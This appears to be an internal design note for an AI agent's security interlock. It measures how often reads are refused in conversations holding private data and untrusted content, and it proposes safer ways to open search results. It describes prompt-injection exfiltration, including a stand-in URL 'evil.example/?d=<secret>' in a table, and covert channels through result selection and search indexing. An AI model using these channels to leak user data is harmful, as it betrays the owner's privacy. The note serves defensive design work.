# Reading the world from an armed conversation — research

**2026-09-24.** The question: *once a conversation holds private data and
third-party content, what can it still read, what can it not, and which of
the refusals are protecting something?* The owner's words, which are the
measurement that matters: not being able to search "has been very
frustrating", and a design where a tool can't read in data from an MCP
server "prevents a lot of tools from ever working and seems too
restrictive".

`EGRESS-DESIGN.md` (2026-09-17) answered half of this for `web_search`. This
document is about the half it left: **opening what you found**, and reads
that are refused because they were labelled as sends.

---

## 1. What is refused today, measured

Over the owner's 578 non-test sessions (`~/.mecha/sessions`, `meta.kind` not
`test` or `experiment`, read-only, 2026-09-24):

- **198 (34%) became armed**, both legs set. Median first arming: the 5th
  message; 13 armed within the first exchange. Taint never disarms, so from
  then on the conversation is armed for good.
- **65 interlock refusals**: `web_search` 33, `http_fetch` 17, `shell` 8, the
  `research` subagent 4, `factory__type_list` 2, `factory__surface_list` 1.
- **`web_search` refusals stopped on 2026-09-17.** 15 armed searches before
  that date (11 refused), 1 after (served, blind, at quick depth). D5 works.
- After a refusal, the model **told the owner and stopped** 25 times, asked a
  question 11, delegated to `research` 10 (which is itself refused from an
  armed parent), retried 3, and tried another tool 5.

And on the machine as configured now (`mecha tools --json`, 64 tools): 39
have no egress and are never refused, 20 are routed to the outbox and are
never refused, `web_search` is blind, and **4 reads are classed as sends**:
`http_fetch`, `factory__poll_status`, `factory__surface_list`,
`factory__type_list`. The three factory reads are fixed at their source in
mecha-factory #21 (§3.1). That leaves one tool, and it is the one the owner
means.

So the owner's experience is precise: **you can search, and you cannot open
the result.** The `research` subagent, which exists to do exactly that, is
refused from any armed parent because a child holding `http_fetch` derives
`Chosen` (`TRIFECTA.md` channel 4).

## 2. Why a read is ever a send

The interlock asks one question of a tool: *can a model-chosen payload reach
a party the injection's author can read?* `EGRESS-DESIGN.md` §2 split that by
**who chooses the destination**. For reads, a third column decides it:
**who authored the arguments.**

| Call | Destination chosen by | Arguments authored by | Channel |
|---|---|---|---|
| `http_fetch(url)` | model | model | unbounded: `evil.example/?d=<secret>` |
| `web_search(query)` | operator | model | bounded by the backend (D4); owned by the leak guard |
| `poll_status(id)` before #21 | operator | model | small, but real: any string reached the box |
| `poll_status(id)` after #21 | operator | **this machine's records** | none: the id must already be on disk |
| `surface_list()` | operator | nobody (no arguments) | none |
| "open result 3" | the search index | **the run's own record** | `log2(N)` bits per call |

The last row does not exist yet. It is the proposal (§3.2).

The general form: **a call is a send only through what the model composed.**
An argument taken verbatim from something the run already holds (a local
record, or a result list it already received) carries at most the bits of
*which one was chosen*. The existing rule "Blind is earned in code by a
schema with no destination" is the special case where the schema leaves the
model nothing to compose at all.

## 3. Options

### 3.1 First-party reads are not sinks (done: mecha-factory #21)

A read of ours carries `readOnlyHint` alone, and anything it sends to a
remote comes from local state. `poll_status` answers only for polls this
machine's record names; `surface_list` and `type_list` take no arguments.
The untrusted marking comes from the operator's
`[mcp.capabilities] untrusted_input`, because `agent.rs` computes untrusted
taint as the declared capability **and** an external result.

That dependency is the residual. An operator who leaves the override off
gets third-party text arriving unmarked, and mecha-mail's reads have
depended on it since they shipped. See §3.5.

### 3.2 Open what you found: `web_open`, a fetch with no destination

A new built-in whose schema is `{result: integer}` (and later
`{page, link: integer}`), not `{url: string}`. It dereferences the index
against this conversation's own record of what `web_search` returned, and
fetches that URL, exactly as it was received.

- **Blind by schema**, so it is earned in code under the existing rule,
  with no new exception and no TOML grant. The model chooses an index; the
  URL was written by the search backend, not composed.
- **The record is `grounding::calls`**: first seen wins, and a stale
  (compacted) result is never evidence. The walk that makes this safe
  already exists and has four callers.
- **Following links** extends the same way: a fetched page's links are
  numbered in its result, and `{page, link}` opens one. Still selection,
  never composition.
- `http_fetch` stays exactly as it is, `Chosen` (D9). A URL the owner
  typed, or one from mail, goes through it, and is refused when armed.

**Residuals, stated plainly:**

1. *Selection bits.* Choosing among N results leaks `log2(N)` bits per
   call, to whoever serves the chosen page. Ten results is ~3.3 bits.
2. *The index as a covert channel.* A query is model-composed, so an
   attacker who has pages indexed for arbitrary tokens could learn which
   token the model searched for from which page it then opened. That is the
   D4/§6 residual of blind search itself, turned into a read receipt: real,
   slow, and requiring the attacker to win an indexing race per token.
3. Both are **bandwidth, not reach**, and both are bounded by one number: a
   per-conversation budget of blind calls. That is EGRESS-DESIGN §6 item 1's
   phase 2, and it needs the `RunStats` counter that item names first.

### 3.3 The owner's own question: a clean research child

`research` is refused from an armed parent because the parent *composes*
the child's prompt, so the child inherits the parent's taint (channel 4).
But when the question is the **owner's words verbatim** (typed in the TUI,
web chat, or Slack as `/research …`), no model composed it. A child started
from exactly those bytes, and nothing else, is honestly clean. It gets the
full chain, deep search and `http_fetch`, and its answer returns to the
parent as untrusted content.

The owner's question may itself hold private data. That is the owner
choosing to send it, which is the principal's call, not an injection's.
This is a surface feature (a command on each door), not a loop change: the
loop already runs a fresh `Conversation` clean.

### 3.4 Third-party MCP servers: a schema-pinned owner ruling

Public MCP servers commonly mark every tool `openWorldHint`, reads included,
so on first contact every read is `Chosen`. The per-tool fix:

- The owner rules, in the **operator** config only (never a checked-out
  layer), that a named tool's input names no destination.
- mecha treats it as `Blind` and records a hash of the schema ruled on. If
  the server later changes that schema (adds a `url`, say), the ruling is
  void, the tool reverts to `Chosen`, and `mecha doctor` names why.

This relaxes two written rules, "Blind is earned in code, never granted in
TOML" and "capability overrides only widen". The pin is what keeps it
honest: the owner vouches for a schema they read, not for a server forever.
It is the only option here that changes a stated invariant, and it has no
user today. Every MCP server on this machine is first-party, so it waits for
one.

### 3.5 MCP results default to untrusted

Today an MCP result is untrusted only if the server says `openWorldHint` or
the operator forces it. "Unknown is never clean" says the default should be
the other way round. Once reads are no longer sends (§3.1), flipping it
adds no refusals of reads, because the interlock only refuses `Chosen`. It
is not free. Any MCP call would then arm a conversation by itself, so more
conversations arm, and an armed conversation's `web_search` is narrowed to
blind backends at quick depth (D5). On this machine the marginal cost is
small, since graph, mail and docs are already forced untrusted and those are
what arm sessions now. What it buys: a new server's text arrives marked,
and no learned rule can be minted from it. That is the fail-closed
direction, and it would retire the per-server `untrusted_input` lines in the
owner's config.

## 4. What stays as it is

- `http_fetch` with a model-composed URL: `Chosen`, refused when armed (D9).
- Every send whose recipient the model names: the outbox (20 tools today,
  none refused).
- `shell`: the sandbox owns it (channel 1). 8 of the 65 refusals were an
  unconfined shell, and the remedy is `[sandbox]`, not the interlock.
- Taint never decays. A turn boundary is not a security boundary, and
  nothing here asks it to be one.

## 5. Recommendation, in order

1. **§3.1**: merge mecha-factory #21, add the operator override, install.
   Three of the four read-as-send tools stop being refused.
2. **§3.2 `web_open`**, with the blind-call counter first and a budget
   second. It targets the actual complaint and needs no invariant
   exception.
3. **§3.5**: flip the MCP default to untrusted. A small change in
   `mcp.rs` plus a config cleanup, in its own PR, because it changes what
   every server's text is.
4. **§3.3 owner-authored research**, on whichever door is used most.
5. **§3.4** when a third-party server first needs it, and not before.

## 6. How it will be measured

The experiment system can grade this directly (`EXPERIMENT-DESIGN.md`). A
suite of search-then-read tasks in an environment that arms the conversation
first: two arms, today's tools against `web_open`, pinned
`blocked_sends: 0`, graded on whether the answer holds a fact that appears
only on the opened page. The prediction to falsify: the refusal rate goes
from roughly every task to zero, with no case where a composed URL was
fetched.

## 7. Rulings wanted from the owner

- **R1:** is `log2(N)` per call, under a per-conversation budget, an
  acceptable residual for `web_open`? (§3.2)
- **R2:** should MCP results default to untrusted? (§3.5)
- **R3:** which door gets owner-authored research first? (§3.3)
- **R4:** is a schema-pinned ruling acceptable in principle, to be built
  when first needed? (§3.4)
